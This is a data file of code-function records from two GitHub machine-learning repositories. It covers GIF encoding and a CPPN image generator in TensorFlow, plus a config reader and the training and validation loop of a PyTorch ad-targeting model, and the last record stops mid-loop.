{"docstring": "\"\"\" getheaderAnim(im)\n\nGet animation header. To replace PILs getheader()[0]\n\n\"\"\"\n", "func_signal": "def getheaderAnim(self, im):\n", "code": "bb = \"GIF89a\"\nbb += intToBin(im.size[0])\nbb += intToBin(im.size[1])\nbb += \"\\x87\\x00\\x00\"\nreturn bb", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "# convert to PIL.Image format from np array (0, 1)\n", "func_signal": "def to_image(self, image_data):\n", "code": "img_data = np.array(1-image_data)\ny_dim = image_data.shape[0]\nx_dim = image_data.shape[1]\nc_dim = self.cppn.c_dim\nif c_dim > 1:\n  img_data = np.array(img_data.reshape((y_dim, x_dim, c_dim))*255.0, dtype=np.uint8)\nelse:\n  img_data = np.array(img_data.reshape((y_dim, x_dim))*255.0, dtype=np.uint8)\nim = Image.fromarray(img_data)\nreturn im", "path": "sampler.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" getSubRectangles(ims)\n\nCalculate the minimal rectangles that need updating each frame.\nReturns a two-element tuple containing the cropped images and a\nlist of x-y positions.\n\nCalculating the subrectangles takes extra time, obviously. However,\nif the image sizes were reduced, the actual writing of the GIF\ngoes faster. In some cases applying this method produces a GIF faster.\n\n\"\"\"\n\n# Check image count\n", "func_signal": "def getSubRectangles(self, ims):\n", "code": "if len(ims) < 2:\n    return ims, [(0,0) for i in ims]\n\n# We need numpy\nif np is None:\n    raise RuntimeError(\"Need Numpy to calculate sub-rectangles. \")\n\n# Prepare\nims2 = [ims[0]]\nxy = [(0,0)]\nt0 = time.time()\n\n# Iterate over images\nprev = ims[0]\nfor im in ims[1:]:\n\n    # Get difference, sum over colors\n    diff = np.abs(im-prev)\n    if diff.ndim==3:\n        diff = diff.sum(2)\n    # Get begin and end for both dimensions\n    X = np.argwhere(diff.sum(0))\n    Y = np.argwhere(diff.sum(1))\n    # Get rect coordinates\n    if X.size and Y.size:\n        x0, x1 = X[0], X[-1]+1\n        y0, y1 = Y[0], Y[-1]+1\n    else: # No change ... make it minimal\n        x0, x1 = 0, 2\n        y0, y1 = 0, 2\n\n    # Cut out and store\n    im2 = im[y0:y1,x0:x1]\n    prev = im\n    ims2.append(im2)\n    xy.append((x0,y0))\n\n# Done\n#print('%1.2f seconds to determine subrectangles of  %i images' %\n#    (time.time()-t0, len(ims2)) )\nreturn ims2, xy", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\"\n\nArgs:\nz_dim: how many dimensions of the latent space vector (R^z_dim)\nc_dim: 1 for mono, 3 for rgb.  dimension for output space.  you can modify code to do HSV rather than RGB.\nnet_size: number of nodes for each fully connected layer of cppn\nscale: the bigger, the more zoomed out the picture becomes\n\n\"\"\"\n\n", "func_signal": "def __init__(self, batch_size=1, z_dim = 32, c_dim = 1, scale = 8.0, net_size = 32):\n", "code": "self.batch_size = batch_size\nself.net_size = net_size\nx_dim = 256\ny_dim = 256\nself.x_dim = x_dim\nself.y_dim = y_dim\nself.scale = scale\nself.c_dim = c_dim\nself.z_dim = z_dim\n\n# tf Graph batch of image (batch_size, height, width, depth)\nself.batch = tf.placeholder(tf.float32, [batch_size, x_dim, y_dim, c_dim])\n\nn_points = x_dim * y_dim\nself.n_points = n_points\n\nself.x_vec, self.y_vec, self.r_vec = self._coordinates(x_dim, y_dim, scale)\n\n# latent vector\nself.z = tf.placeholder(tf.float32, [self.batch_size, self.z_dim])\n# inputs to cppn, like coordinates and radius from centre\nself.x = tf.placeholder(tf.float32, [self.batch_size, None, 1])\nself.y = tf.placeholder(tf.float32, [self.batch_size, None, 1])\nself.r = tf.placeholder(tf.float32, [self.batch_size, None, 1])\n\n# builds the generator network\nself.G = self.generator(x_dim = self.x_dim, y_dim = self.y_dim)\n\nself.init()", "path": "model.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" getAppExt(loops=float('inf'))\n\nApplication extention. This part specifies the amount of loops.\nIf loops is 0 or inf, it goes on infinitely.\n\n\"\"\"\n\n", "func_signal": "def getAppExt(self, loops=float('inf')):\n", "code": "if loops==0 or loops==float('inf'):\n    loops = 2**16-1\n    #bb = \"\" # application extension should not be used\n            # (the extension interprets zero loops\n            # to mean an infinite number of loops)\n            # Mmm, does not seem to work\nif True:\n    bb = \"\\x21\\xFF\\x0B\"  # application extension\n    bb += \"NETSCAPE2.0\"\n    bb += \"\\x03\\x01\"\n    bb += intToBin(loops)\n    bb += '\\x00'  # end\nreturn bb", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" getImageDescriptor(im, xy=None)\n\nUsed for the local color table properties per image.\nOtherwise global color table applies to all frames irrespective of\nwhether additional colors comes in play that require a redefined\npalette. Still a maximum of 256 color per frame, obviously.\n\nWritten by Ant1 on 2010-08-22\nModified by Alex Robinson in Janurari 2011 to implement subrectangles.\n\n\"\"\"\n\n# Defaule use full image and place at upper left\n", "func_signal": "def getImageDescriptor(self, im, xy=None):\n", "code": "if xy is None:\n    xy  = (0,0)\n\n# Image separator,\nbb = '\\x2C'\n\n# Image position and size\nbb += intToBin( xy[0] ) # Left position\nbb += intToBin( xy[1] ) # Top position\nbb += intToBin( im.size[0] ) # image width\nbb += intToBin( im.size[1] ) # image height\n\n# packed field: local color table flag1, interlace0, sorted table0,\n# reserved00, lct size111=7=2^(7+1)=256.\nbb += '\\x87'\n\n# LZW minimum size code now comes later, begining of [image data] blocks\nreturn bb", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\"Move neuron i towards biased (b,g,r) by factor alpha\"\"\"\n", "func_signal": "def altersingle(self, alpha, i, b, g, r):\n", "code": "n = self.network[i] # Alter hit neuron\nn[0] -= (alpha*(n[0] - b))\nn[1] -= (alpha*(n[1] - g))\nn[2] -= (alpha*(n[2] - r))", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "# Initializing the tensor flow variables\n", "func_signal": "def init(self):\n", "code": "    init = tf.global_variables_initializer()\n    # Launch the session\n    self.sess = tf.Session()\n    self.sess.run(init)", "path": "model.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" handleSubRectangles(images)\n\nHandle the sub-rectangle stuff. If the rectangles are given by the\nuser, the values are checked. Otherwise the subrectangles are\ncalculated automatically.\n\n\"\"\"\n\n", "func_signal": "def handleSubRectangles(self, images, subRectangles):\n", "code": "if isinstance(subRectangles, (tuple,list)):\n    # xy given directly\n\n    # Check xy\n    xy = subRectangles\n    if xy is None:\n        xy = (0,0)\n    if hasattr(xy, '__len__'):\n        if len(xy) == len(images):\n            xy = [xxyy for xxyy in xy]\n        else:\n            raise ValueError(\"len(xy) doesn't match amount of images.\")\n    else:\n        xy = [xy for im in images]\n    xy[0] = (0,0)\n\nelse:\n    # Calculate xy using some basic image processing\n\n    # Check Numpy\n    if np is None:\n        raise RuntimeError(\"Need Numpy to use auto-subRectangles.\")\n\n    # First make numpy arrays if required\n    for i in range(len(images)):\n        im = images[i]\n        if isinstance(im, Image.Image):\n            tmp = im.convert() # Make without palette\n            a = np.asarray(tmp)\n            if len(a.shape)==0:\n                raise MemoryError(\"Too little memory to convert PIL image to array\")\n            images[i] = a\n\n    # Determine the sub rectangles\n    images, xy = self.getSubRectangles(images)\n\n# Done\nreturn images, xy", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" getGraphicsControlExt(duration=0.1, dispose=2)\n\nGraphics Control Extension. A sort of header at the start of\neach image. Specifies duration and transparancy.\n\nDispose\n-------\n  * 0 - No disposal specified.\n  * 1 - Do not dispose. The graphic is to be left in place.\n  * 2 - Restore to background color. The area used by the graphic\n    must be restored to the background color.\n  * 3 - Restore to previous. The decoder is required to restore the\n    area overwritten by the graphic with what was there prior to\n    rendering the graphic.\n  * 4-7 -To be defined.\n\n\"\"\"\n\n", "func_signal": "def getGraphicsControlExt(self, duration=0.1, dispose=2):\n", "code": "bb = '\\x21\\xF9\\x04'\nbb += chr((dispose & 3) << 2)  # low bit 1 == transparency,\n# 2nd bit 1 == user input , next 3 bits, the low two of which are used,\n# are dispose.\nbb += intToBin( int(duration*100) ) # in 100th of seconds\nbb += '\\x00'  # no transparant color\nbb += '\\x00'  # end\nreturn bb", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\"\" This function can be used if no scipy is availabe.\nIt's 7 times slower though.\n\"\"\"\n", "func_signal": "def quantize_without_scipy(self, image):\n", "code": "w,h = image.size\npx = np.asarray(image).copy()\nmemo = {}\nfor j in range(w):\n    for i in range(h):\n        key = (px[i,j,0],px[i,j,1],px[i,j,2])\n        try:\n            val = memo[key]\n        except KeyError:\n            val = self.convert(*key)\n            memo[key] = val\n        px[i,j,0],px[i,j,1],px[i,j,2] = val\nreturn Image.fromarray(px).convert(\"RGB\").quantize(palette=self.paletteImage())", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" Generate data by sampling from latent space.\n\nIf z is not None, data for this point in latent space is\ngenerated. Otherwise, z is drawn from prior in latent\nspace.\n\"\"\"\n", "func_signal": "def generate(self, z=None, x_dim = 26, y_dim = 26, scale = 8.0):\n", "code": "if z is None:\n    z = np.random.uniform(-1.0, 1.0, size=(self.batch_size, self.z_dim)).astype(np.float32)\n# Note: This maps to mean of distribution, we could alternatively\n# sample from Gaussian distribution\n\nG = self.generator(x_dim = x_dim, y_dim = y_dim, reuse = True)\nx_vec, y_vec, r_vec = self._coordinates(x_dim, y_dim, scale = scale)\nimage = self.sess.run(G, feed_dict={self.z: z, self.x: x_vec, self.y: y_vec, self.r: r_vec})\nreturn image", "path": "model.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" checkImages(images)\nCheck numpy images and correct intensity range etc.\nThe same for all movie formats.\n\"\"\"\n# Init results\n", "func_signal": "def checkImages(images):\n", "code": "images2 = []\n\nfor im in images:\n    if PIL and isinstance(im, PIL.Image.Image):\n        # We assume PIL images are allright\n        images2.append(im)\n\n    elif np and isinstance(im, np.ndarray):\n        # Check and convert dtype\n        if im.dtype == np.uint8:\n            images2.append(im) # Ok\n        elif im.dtype in [np.float32, np.float64]:\n            im = im.copy()\n            im[im<0] = 0\n            im[im>1] = 1\n            im *= 255\n            images2.append( im.astype(np.uint8) )\n        else:\n            im = im.astype(np.uint8)\n            images2.append(im)\n        # Check size\n        if im.ndim == 2:\n            pass # ok\n        elif im.ndim == 3:\n            if im.shape[2] not in [3,4]:\n                raise ValueError('This array can not represent an image.')\n        else:\n            raise ValueError('This array can not represent an image.')\n    else:\n        raise ValueError('Invalid image type: ' + str(type(im)))\n\n# Done\nreturn images2", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "\"\"\" writeGifToFile(fp, images, durations, loops, xys, disposes)\n\nGiven a set of images writes the bytes to the specified stream.\n\n\"\"\"\n\n# Obtain palette for all images and count each occurance\n", "func_signal": "def writeGifToFile(self, fp, images, durations, loops, xys, disposes):\n", "code": "palettes, occur = [], []\nfor im in images:\n    #palette = getheader(im)[1]\n    palette = getheader(im)[0][-1]\n    if not palette:\n      #palette = PIL.ImagePalette.ImageColor\n        palette = im.palette.tobytes()\n    palettes.append(palette)\nfor palette in palettes:\n    occur.append( palettes.count( palette ) )\n\n# Select most-used palette as the global one (or first in case no max)\nglobalPalette = palettes[ occur.index(max(occur)) ]\n\n# Init\nframes = 0\nfirstFrame = True\n\n\nfor im, palette in zip(images, palettes):\n\n    if firstFrame:\n        # Write header\n\n        # Gather info\n        header = self.getheaderAnim(im)\n        appext = self.getAppExt(loops)\n\n        # Write\n        fp.write(encode(header))\n        fp.write(globalPalette)\n        fp.write(encode(appext))\n\n        # Next frame is not the first\n        firstFrame = False\n\n    if True:\n        # Write palette and image data\n\n        # Gather info\n        data = getdata(im)\n        imdes, data = data[0], data[1:]\n        graphext = self.getGraphicsControlExt(durations[frames],\n                                                disposes[frames])\n        # Make image descriptor suitable for using 256 local color palette\n        lid = self.getImageDescriptor(im, xys[frames])\n\n        # Write local header\n        if (palette != globalPalette) or (disposes[frames] != 2):\n            # Use local color palette\n            fp.write(encode(graphext))\n            fp.write(encode(lid)) # write suitable image descriptor\n            fp.write(palette) # write local color table\n            fp.write(encode('\\x08')) # LZW minimum size code\n        else:\n            # Use global color palette\n            fp.write(encode(graphext))\n            fp.write(imdes) # write suitable image descriptor\n\n        # Write image data\n        for d in data:\n            fp.write(d)\n\n    # Prepare for next round\n    frames = frames + 1\n\nfp.write(encode(\";\"))  # end gif\nreturn frames", "path": "images2gif.py", "repo_name": "hardmaru/cppn-tensorflow", "stars": 312, "license": "None", "language": "python", "size": 64603}
{"docstring": "'''\n\n:param config_fn: a yaml file\n:return:\n'''\n", "func_signal": "def read_config(config_fn):\n", "code": "with open(config_fn) as f:\n    config = yaml.load(f)\nprint(config)\nreturn config", "path": "src\\lib\\tools.py", "repo_name": "DiligentPanda/Tencent_Ads_Algo_2018", "stars": 291, "license": "mit", "language": "python", "size": 448}
{"docstring": "# load users, ads and their information of features\n", "func_signal": "def main():\n", "code": "users, ads, u_feat_infos, a_feat_infos = load_users_and_ads(cfg[\"data\"][\"user_fn\"],\n                                                            cfg[\"data\"][\"ad_fn\"],\n                                                            cfg[\"data\"][\"user_fi_fn\"],\n                                                            cfg[\"data\"][\"ad_fi_fn\"],\n                                                            )\n\n\nr_feat_infos = load_feature_infos(cfg[\"data\"][\"r_fi_fp\"])\n\nlogging.info(\"There are {} users.\".format(len(users)))\nlogging.info(\"There are {} ads.\".format(len(ads)))\n\n# load data list and history features\nif not args.test:\n    train_list = load_data_list(cfg[\"train_fp\"])\n    #print(\"train list len:\",len(train_list))\n    train_rfeats = load_rfeats(cfg[\"data\"][\"train_rfeat_fp\"])\n    valid_list = load_data_list(cfg[\"valid_fp\"])\n    valid_rfeats = load_rfeats(cfg[\"data\"][\"valid_rfeat_fp\"])\nelse:\n    test_list = load_data_list(cfg[\"test_fp\"])\n    test_rfeats = load_rfeats(cfg[\"data\"][\"test_rfeat_fp\"])\n\nfilter = cfg[\"feat\"][\"filter\"]\n\n# construct mappng and filter\n[fi.construct_mapping() for fi in u_feat_infos]\n[fi.construct_mapping() for fi in a_feat_infos]\n[fi.construct_mapping() for fi in r_feat_infos]\n\n# filter out low-frequency features.\nfor fi in u_feat_infos:\n    if fi.name in filter:\n        fi.construct_filter(l_freq=filter[fi.name])\n    else:\n        fi.construct_filter(l_freq=0)\nlogging.warning(\"Users Filtering!!!\")\n\nfor fi in a_feat_infos:\n    if fi.name in filter:\n        fi.construct_filter(l_freq=filter[fi.name])\n    else:\n        fi.construct_filter(l_freq=0)\nlogging.warning(\"Ads Filtering!!!\")\n\nreg = cfg[\"reg\"]\n\nif not args.test:\n    train_dataset = DatasetYouth(users,u_feat_infos,\n                                ads,a_feat_infos,\n                                train_rfeats, r_feat_infos,\n                                train_list,\n                                cfg[\"feat\"][\"u_enc\"],\n                                cfg[\"feat\"][\"a_enc\"],\n                                cfg[\"feat\"][\"r_enc\"],\n                                reg = reg,\n                                pos_weight=cfg[\"train\"][\"pos_weight\"],\n                                has_label=True)\n\n    #print(\"train num: \",train_dataset.original_len)\n\n    if cfg[\"train\"][\"use_radio_sampler\"]:\n        radio_sampler = RadioSampler(train_dataset,p2n_radio=cfg[\"train\"][\"p2n_radio\"])\n        logging.info(\"Using radio sampler with p:n={}\".format(cfg[\"train\"][\"p2n_radio\"]))\n\n    valid_dataset = DatasetYouth(users,u_feat_infos,\n                                ads,a_feat_infos,\n                                valid_rfeats, r_feat_infos,\n                                valid_list,\n                                cfg[\"feat\"][\"u_enc\"],\n                                cfg[\"feat\"][\"a_enc\"],\n                                cfg[\"feat\"][\"r_enc\"],\n                                reg = reg,\n                                pos_weight=cfg[\"train\"][\"pos_weight\"],\n                                has_label=True)\n\n    dataset = train_dataset\n\nelse:\n    test_dataset = DatasetYouth(users,u_feat_infos,\n                                ads,a_feat_infos,\n                                test_rfeats, r_feat_infos,\n                                test_list,\n                                cfg[\"feat\"][\"u_enc\"],\n                                cfg[\"feat\"][\"a_enc\"],\n                                cfg[\"feat\"][\"r_enc\"],\n                                reg = reg,\n                                has_label=False)\n\n    dataset = test_dataset\n\nlogging.info(\"shuffle: {}\".format(False if cfg[\"train\"][\"use_radio_sampler\"] else True))\n\n\n\n# set up model\nemedding_cfgs = {}\nemedding_cfgs.update(cfg[\"feat\"][\"u_embed_cfg\"])\nemedding_cfgs.update(cfg[\"feat\"][\"a_embed_cfg\"])\n\nloss_cfg = cfg[\"loss\"]\n\n# create model\nmodel = eval(cfg[\"model_name\"])(n_out=1,\n                                u_embedding_feat_infos=dataset.embedding_u_feat_infos,\n                                u_one_hot_feat_infos=dataset.one_hot_u_feat_infos,\n                                a_embedding_feat_infos=dataset.embedding_a_feat_infos,\n                                a_one_hot_feat_infos=dataset.one_hot_a_feat_infos,\n                                r_embedding_feat_infos=dataset.embedding_r_feat_infos,\n                                embedding_cfgs=emedding_cfgs,\n                                loss_cfg=loss_cfg,\n                                )\n\n\n# model = DataParallel(model,device_ids=cfg[\"gpus\"])\n# logging.info(\"Using model {}.\".format(cfg[\"model_name\"]))\n\n## optmizers\n# todo lr,weight decay\noptimizer = Adam(model.get_train_policy(), lr=cfg[\"optim\"][\"lr\"],weight_decay=cfg[\"optim\"][\"weight_decay\"], amsgrad=True)\n#optimizer = optim.SGD(model.parameters(), lr = 0.005, momentum=0.9,weight_decay=cfg[\"optim\"][\"weight_decay\"])\nlogging.info(\"Using optimizer {}.\".format(optimizer))\n\n\nif cfg[\"train\"][\"resume\"] or args.test:\n    checkpoint_file = cfg[\"resume_fp\"]\n    state = load_checkpoint(checkpoint_file)\n    logging.info(\"Load checkpoint file {}.\".format(checkpoint_file))\n    st_epoch = state[\"cur_epoch\"]+1\n    logging.info(\"Start from {}th epoch.\".format(st_epoch))\n    model.load_state_dict(state[\"model_state\"])\n    optimizer.load_state_dict(state[\"optimizer_state\"])\nelse:\n    st_epoch = 1\ned_epoch = cfg[\"train\"][\"ed_epoch\"]\n\n# move tensor to gpu and wrap tensor with Variable\nto_gpu_variable = dataset.get_to_gpu_variable_func()\n\n\nif args.extract_weight:\n    model = model.module\n    path = os.path.join(cfg[\"output_path\"],\"weight\")\n    os.makedirs(path,exist_ok=True)\n    u_embedder = model.u_embedder\n    u_embedder.save_weight(path)\n    a_embedder = model.a_embedder\n    a_embedder.save_weight(path)\n    exit(0)\n\ndef evaluate(output, label, label_weights):\n    '''\n    Note the input to this function should be converted to data first.\n    :param output:\n    :param label_weights:\n    :param target:\n    :return:\n    '''\n    output = output.view(-1)\n    label = label.view(-1).byte()\n    #print(output[0:100])\n    #print(label[0:100])\n    scores = torch.sigmoid(output)\n    output = scores>0.1\n    #print(output)\n    # print(label.float().sum())\n    tp = ((output==label)*label).float().sum()\n    fp = ((output!=label)*output).float().sum()\n    fn = ((output!=label)*(1-output)).float().sum()\n    tn = ((output==label)*(1-label)).float().sum()\n    return tp,fp,fn,tn,scores.cpu()\n\ndef valid(cur_train_epoch, phase=\"valid\", extract_features=False):\n    '''\n\n    :param cur_train_epoch:\n    :param phase: \"valid\" or \"test\"\n    :return:\n    '''\n    assert phase in [\"valid\",\"test\"]\n\n    results = []\n    valid_detail_meters = {\n        \"loss\": SumMeter(),\n        \"model_loss\": SumMeter(),\n        \"tp\": SumMeter(),\n        \"fn\": SumMeter(),\n        \"fp\": SumMeter(),\n        \"tn\": SumMeter(),\n        \"batch_time\": AverageMeter(),\n        \"io_time\": AverageMeter(),\n    }\n\n    if phase==\"valid\":\n        logging.info(\"Valid data.\")\n        dataset = valid_dataset\n    else:\n        logging.info(\"Test data.\")\n        dataset = test_dataset\n\n    model.eval()\n    logging.info(\"Set network to eval model\")\n\n\n    if extract_features:\n        features =  np.zeros(shape=(dataset.original_len,model.n_output_feat),dtype=np.float32)\n        features_ctr = 0\n\n    batch_idx = 0\n\n    # chunked here\n    chunk_size = 200\n    n_chunk = (dataset.original_len+(cfg[phase][\"batch_size\"]*chunk_size)-1)//(cfg[phase][\"batch_size\"]*chunk_size)\n    n_batch = (dataset.original_len+cfg[phase][\"batch_size\"]-1)//cfg[phase][\"batch_size\"]\n\n\n    for chunk_idx in range(n_chunk):\n        s = chunk_idx*cfg[phase][\"batch_size\"]*chunk_size\n        e = (chunk_idx+1)*cfg[phase][\"batch_size\"]*chunk_size\n\n        dataloader = DataLoader(dataset.slice(s,e),\n                                  batch_size=cfg[phase][\"batch_size\"],\n                                  shuffle=False,\n                                  num_workers=cfg[phase][\"n_worker\"],\n                                  collate_fn=dataset.get_collate_func(),\n                                  pin_memory=True,\n                                  drop_last=False,\n                                  )\n\n        batch_time_s = time.time()\n        for samples in dataloader:\n            batch_idx = batch_idx + 1\n            cur_batch = batch_idx\n            valid_detail_meters[\"io_time\"].update(time.time()-batch_time_s)\n\n            # move to gpu\n            samples = to_gpu_variable(samples,volatile=True)\n\n            # forward\n            loss, output, model_loss, reg_loss, d = model(samples)\n\n            if phase == \"valid\":\n\n                # evaluate metrics\n                valid_detail_meters[\"loss\"].update(loss.data[0]*samples[\"size\"],samples[\"size\"])\n                valid_detail_meters[\"model_loss\"].update(model_loss.data[0]*samples[\"size\"],samples[\"size\"])\n                tp, fp, fn, tn, scores = evaluate(output.data, samples[\"labels\"].data, samples[\"label_weights\"].data)\n                #print(tp,fn,fp,tn)\n                valid_detail_meters[\"tp\"].update(tp,samples[\"size\"])\n                valid_detail_meters[\"fp\"].update(fp,samples[\"size\"])\n                valid_detail_meters[\"fn\"].update(fn,samples[\"size\"])\n                valid_detail_meters[\"tn\"].update(tn,samples[\"size\"])\n                # the large the better\n                tp_rate = valid_detail_meters[\"tp\"].sum/(valid_detail_meters[\"tp\"].sum+valid_detail_meters[\"fn\"].sum+1e-20)\n                # the smaller the better\n                fp_rate = valid_detail_meters[\"fp\"].sum/(valid_detail_meters[\"fp\"].sum+valid_detail_meters[\"tn\"].sum+1e-20)\n                valid_detail_meters[\"batch_time\"].update(time.time() - batch_time_s)\n                batch_time_s = time.time()\n            else:\n                scores = torch.sigmoid(output.data)\n                valid_detail_meters[\"batch_time\"].update(time.time() - batch_time_s)\n                batch_time_s = time.time()\n\n            # collect results\n            uids = samples[\"uids\"]\n            aids = samples[\"aids\"]\n            results.extend(zip(aids,uids,scores))\n\n\n            # collect features\n            if extract_features:\n                bs = samples[\"size\"]\n                features[features_ctr:features_ctr+bs,:] = d.data.cpu().numpy()\n                features_ctr += bs\n\n            # log results\n            if phase==\"valid\":\n                if cur_batch % cfg[\"valid\"][\"logging_freq\"] == 0:\n                    logging.info(\"Valid Batch [{cur_batch}/{ed_batch}] \"\n                                 \"loss: {loss} \"\n                                 \"model_loss: {model_loss} \"\n                                 \"tp: {tp} fn: {fn} fp: {fp} tn: {tn} \"\n                                 \"tp_rate: {tp_rate} fp_rate: {fp_rate} \"\n                                 \"io time: {io_time}s batch time {batch_time}s\".format(\n                        cur_batch=cur_batch,\n                        ed_batch=n_batch,\n                        loss=valid_detail_meters[\"loss\"].mean,\n                        model_loss=valid_detail_meters[\"model_loss\"].mean,\n                        tp = valid_detail_meters[\"tp\"].sum,\n                        fn=valid_detail_meters[\"fn\"].sum,\n                        fp = valid_detail_meters[\"fp\"].sum,\n                        tn = valid_detail_meters[\"tn\"].sum,\n                        tp_rate = tp_rate,\n                        fp_rate = fp_rate,\n                        io_time=valid_detail_meters[\"io_time\"].mean,\n                        batch_time=valid_detail_meters[\"batch_time\"].mean,\n                    )\n                    )\n            else:\n                if cur_batch % cfg[\"test\"][\"logging_freq\"] == 0:\n                    logging.info(\"Test Batch [{cur_batch}/{ed_batch}] \"\n                                 \"io time: {io_time}s batch time {batch_time}s\".format(\n                        cur_batch=cur_batch,\n                        ed_batch=n_batch,\n                        io_time=valid_detail_meters[\"io_time\"].mean,\n                        batch_time=valid_detail_meters[\"batch_time\"].mean,\n                    )\n                    )\n\n    if phase==\"valid\":\n        logging.info(\"{phase} for {cur_train_epoch} train epoch \"\n                     \"loss: {loss} \"\n                     \"model_loss: {model_loss} \"\n                     \"tp_rate: {tp_rate} fp_rate: {fp_rate} \"\n                     \"io time: {io_time}s batch time {batch_time}s\".format(\n                    phase=phase,\n                    cur_train_epoch=cur_train_epoch,\n                    loss=valid_detail_meters[\"loss\"].mean,\n                    model_loss=valid_detail_meters[\"model_loss\"].mean,\n                    tp_rate=tp_rate,\n                    fp_rate=fp_rate,\n                    io_time=valid_detail_meters[\"io_time\"].mean,\n                    batch_time=valid_detail_meters[\"batch_time\"].mean,\n                )\n                )\n\n        # write results to file\n        res_fn = \"{}_{}\".format(cfg[\"valid_res_fp\"], cur_train_epoch)\n        with open(res_fn, 'w') as f:\n            f.write(\"aid,uid,score\\n\")\n            for res in results:\n                f.write(\"{},{},{:.8f}\\n\".format(res[0], res[1], res[2]))\n        # evaluate results\n        avg_auc, aucs = cal_avg_auc(res_fn, cfg[\"valid_fp\"])\n        logging.info(\"Valid for {cur_train_epoch} train epoch \"\n                     \"average auc {avg_auc}\".format(\n            cur_train_epoch=cur_train_epoch,\n            avg_auc=avg_auc,\n        )\n        )\n        logging.info(\"aucs: \")\n        logging.info(pprint.pformat(aucs))\n\n    else:\n        logging.info(\"Test for {} train epoch ends.\".format(cur_train_epoch))\n\n        res_fn = \"{}_{}\".format(cfg[\"test_res_fp\"], cur_train_epoch)\n        with open(res_fn, 'w') as f:\n            f.write(\"aid,uid,score\\n\")\n            for res in results:\n                f.write(\"{},{},{:.8f}\\n\".format(res[0], res[1], res[2]))\n\n    # extract features\n    if extract_features:\n        import pickle as pkl\n        with open(cfg[\"extracted_features_fp\"],\"wb\") as f:\n            pkl.dump(features,f,protocol=pkl.HIGHEST_PROTOCOL)\n\nmodel.cuda()\nlogging.info(\"Move network to gpu.\")\n\nif args.test:\n    valid(st_epoch-1,phase=\"test\",extract_features=args.extract_features)\n    exit(0)\nelif cfg[\"valid\"][\"init_valid\"]:\n    valid(st_epoch-1)\n    model.train()\n    logging.info(\"Set network to train model.\")\n\n# train: main loop\n\nmodel.train()\nlogging.info(\"Set network to train model.\")\n\n# original_lambda = cfg[\"reg\"][\"lambda\"]\ntotal_n_batch = 0\nwarnings.warn(\"total_n_batch always start at 0...\")\n\nfor cur_epoch in range(st_epoch,ed_epoch+1):\n\n    # meters\n    k = cfg[\"train\"][\"logging_freq\"]\n    detail_meters = {\n        \"loss\": RunningValue(k),\n        \"epoch_loss\": SumMeter(),\n        \"model_loss\": RunningValue(k),\n        \"epoch_model_loss\": SumMeter(),\n        \"tp\": RunningValue(k),\n        \"fn\": RunningValue(k),\n        \"fp\": RunningValue(k),\n        \"tn\": RunningValue(k),\n        \"auc\": AUCMeter(),\n        \"batch_time\": AverageMeter(),\n        \"io_time\": AverageMeter(),\n    }\n\n    # adjust lr\n    adjust_learning_rate(cfg[\"optim\"][\"lr\"], optimizer, cur_epoch, cfg[\"train\"][\"lr_steps\"], lr_decay=cfg[\"train\"][\"lr_decay\"])\n\n    # dynamic adjust cfg[\"reg\"][\"lambda\"]\n    # decay = 1/(0.5 ** (sum(cur_epoch > np.array(cfg[\"train\"][\"lr_steps\"]))))\n    # cfg[\"reg\"][\"lambda\"] = original_lambda * decay\n    # print(\"using dynamic regularizer, {}\".format(cfg[\"reg\"][\"lambda\"]))\n\n\n    train_dataset.shuffle()\n\n    batch_idx = -1\n\n    # chunked here because of memory issue. we always create new DataLoader after several batches.\n    chunk_size = 200\n    n_chunk = (train_dataset.original_len+(cfg[\"train\"][\"batch_size\"]*chunk_size)-1)//(cfg[\"train\"][\"batch_size\"]*chunk_size)\n    n_batch = (train_dataset.original_len+cfg[\"train\"][\"batch_size\"]-1)//cfg[\"train\"][\"batch_size\"]\n\n    for chunk_idx in range(n_chunk):\n        s = chunk_idx*cfg[\"train\"][\"batch_size\"]*chunk_size\n        e = (chunk_idx+1)*cfg[\"train\"][\"batch_size\"]*chunk_size\n\n        train_dataloader = DataLoader(train_dataset.slice(s,e),\n                                      batch_size=cfg[\"train\"][\"batch_size\"],\n                                      shuffle=False if cfg[\"train\"][\"use_radio_sampler\"] else True,\n                                      num_workers=cfg[\"train\"][\"n_worker\"],\n                                      collate_fn=train_dataset.get_collate_func(),\n                                      sampler=radio_sampler if cfg[\"train\"][\"use_radio_sampler\"] else None,\n                                      pin_memory=True,\n                                      drop_last=True,\n                                      )\n\n        batch_time_s = time.time()\n        for samples in train_dataloader:\n            total_n_batch += 1\n            batch_idx = batch_idx+1\n            detail_meters[\"io_time\"].update(time.time()-batch_time_s)\n\n            # move to gpu\n            samples = to_gpu_variable(samples)\n\n            # forward\n            loss, output, model_loss, reg_loss, d = model(samples)\n\n            #print(\"reg_loss\",reg_loss)\n\n            # clear grads\n            optimizer.zero_grad()\n\n            # backward\n            loss.backward()\n\n            # This is a little useful\n            warnings.warn(\"Using gradients clipping\")\n            